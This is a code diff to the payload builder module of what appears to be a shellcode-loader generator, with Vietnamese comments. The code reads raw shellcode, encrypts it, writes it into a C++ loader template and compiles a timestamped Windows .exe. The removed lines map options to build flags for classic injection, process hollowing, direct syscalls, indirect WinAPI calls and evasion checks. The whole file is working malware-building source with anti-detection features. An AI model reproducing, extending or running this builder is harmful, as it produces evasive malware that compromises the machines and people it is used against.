@@ -1,10 +1,13 @@
+# controller/modules/builder.py
 import os
 import time
-import random
-import string
 import subprocess
 import logging
 from controller.config import PROJECT_ROOT, OUTPUT_DIR, BUILD_DIR
+
+# Import các module trợ giúp mới
+from controller.modules.definitions import get_defines
+from controller.modules.crypto_utils import apply_encryption
 
 class PayloadBuilder:
     def __init__(self, shellcode_path, options):
@@ -20,77 +23,67 @@ class PayloadBuilder:
             self.logger.error(f"Shellcode not found: {self.shellcode_path}")
             return None
 
-    # --- STAGE 3: TRANSFORMATION IMPLEMENTATION ---
-    def _encrypt_payload(self, raw_shellcode):
-        method = self.options.get('encryption', 'none')
-        key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
-        
-        if method == 'xor':
-            self.logger.info(f"Applying Transformation: XOR Encryption (Key: {key})")
-            encoded = bytearray(b ^ ord(key[i % len(key)]) for i, b in enumerate(raw_shellcode))
-            return encoded, key
-        else:
-            return raw_shellcode, key
-
-    def _generate_defines(self):
-        defines = []
-        # Stage 3
-        if self.options.get('encryption') == 'xor': defines.append("-DENCRYPTION_XOR")
-        
-        # Stage 2 & 4 Mapping
-        inj = self.options.get('injection')
-        if inj == 'classic': defines.append("-DINJECTION_CLASSIC")
-        elif inj == 'hollowing': defines.append("-DINJECTION_HOLLOWING")
-        
-        # API Obfuscation
-        api = self.options.get('api_method')
-        if api == 'syscalls': defines.append("-DUSE_DIRECT_SYSCALLS")
-        elif api == 'winapi-indirect': defines.append("-DUSE_INDIRECT_WINAPI")
-        
-        # Stage 0
-        if self.options.get('anti_evasion'): defines.append("-DEVASION_CHECKS_ENABLED")
-        if self.options.get('debug'): defines.append("-DDEBUG_MODE")
-        
-        return " ".join(defines)
+    def _format_cpp_array(self, data):
+        """Chuyển đổi bytes thành chuỗi C++ array: {0x00, 0x01...}"""
+        return "{" + ", ".join([f"0x{b:02x}" for b in data]) + "};"
 
     def build(self):
+        # 1. Đọc Shellcode (Stage 1 Init)
         raw_sc = self._read_shellcode()
         if not raw_sc: return None
 
-        # Process Stages 1 & 3
-        final_sc, key = self._encrypt_payload(raw_sc)
+        # 2. Xử lý Mã hóa (Stage 3 Transformation - Build Time)
+        enc_method = self.options.get('encryption', 'none')
+        output = apply_encryption(raw_sc, enc_method)
         
-        # Generate Source
-        formatted_sc = "{" + ", ".join([f"0x{b:02x}" for b in final_sc]) + "};"
+        # 3. Chuẩn bị Template C++
+        ciphertext = output["ciphertext"]
+        key = output["key"]
+
+        formatted_sc = self._format_cpp_array(ciphertext)
+        formatted_key = self._format_cpp_array(key)
         
         try:
-            with open(os.path.join(PROJECT_ROOT, 'src', 'main.cpp'), 'r') as f:
+            template_path = os.path.join(PROJECT_ROOT, 'src', 'main.cpp')
+            with open(template_path, 'r', encoding='utf-8') as f:
                 template = f.read()
                 
-            code = template.replace("/*{{DEFINES}}*/", "") \
-                           .replace("/*{{SHELLCODE}}*/", formatted_sc) \
-                           .replace("/*{{SHELLCODE_LEN}}*/", str(len(final_sc))) \
-                           .replace("/*{{KEY}}*/", f'"{key}"')
+            # Thay thế các placeholder
+            # Lưu ý: Placeholder {{DEFINES}} đã bị loại bỏ vì ta dùng cờ biên dịch -D
+            code = template.replace("/*{{SHELLCODE}}*/", formatted_sc) \
+                           .replace("/*{{SHELLCODE_LEN}}*/", str(len(ciphertext))) \
+                           .replace("/*{{KEY}}*/", formatted_key) \
+                           .replace("/*{{KEY_LEN}}*/", str(len(key)))
                            
             src_file = os.path.join(BUILD_DIR, 'generated_loader.cpp')
-            with open(src_file, 'w') as f: f.write(code)
+            with open(src_file, 'w', encoding='utf-8') as f: 
+                f.write(code)
             
         except Exception as e:
             self.logger.error(f"Template generation failed: {e}")
             return None
 
-        # Compilation
-        output_name = f"payload_{int(time.time())}.exe"
-        defines_str = self._generate_defines()
+        # 4. Chuẩn bị Cờ biên dịch (Lấy từ definitions.py)
+        defines_str = get_defines(self.options)
+        print(defines_str)
         
-        # Clean & Build
+        # 5. Thực thi Make
+        output_name = f"payload_{int(time.time())}.exe"
+        
+        # Clean môi trường
         subprocess.run(["make", "clean"], cwd=PROJECT_ROOT, capture_output=True)
         os.makedirs(os.path.join(BUILD_DIR, "obj"), exist_ok=True)
         
-        cmd = ["make", "build", f"SRC={os.path.basename(src_file)}", f"OUT={output_name}", f"DEFINES={defines_str}"]
+        # Lệnh build
+        cmd = ["make", "build", 
+               f"SRC={os.path.basename(src_file)}", 
+               f"OUT={output_name}", 
+               f"DEFINES={defines_str}"]
+        
         self.logger.info(f"Compiling with flags: {defines_str}")
         
         try:
+            # Chạy make tại thư mục gốc
             subprocess.run(cmd, cwd=PROJECT_ROOT, check=True, capture_output=True)
             full_path = os.path.join(OUTPUT_DIR, output_name)
             self.logger.info(f"Build Success: {full_path}")
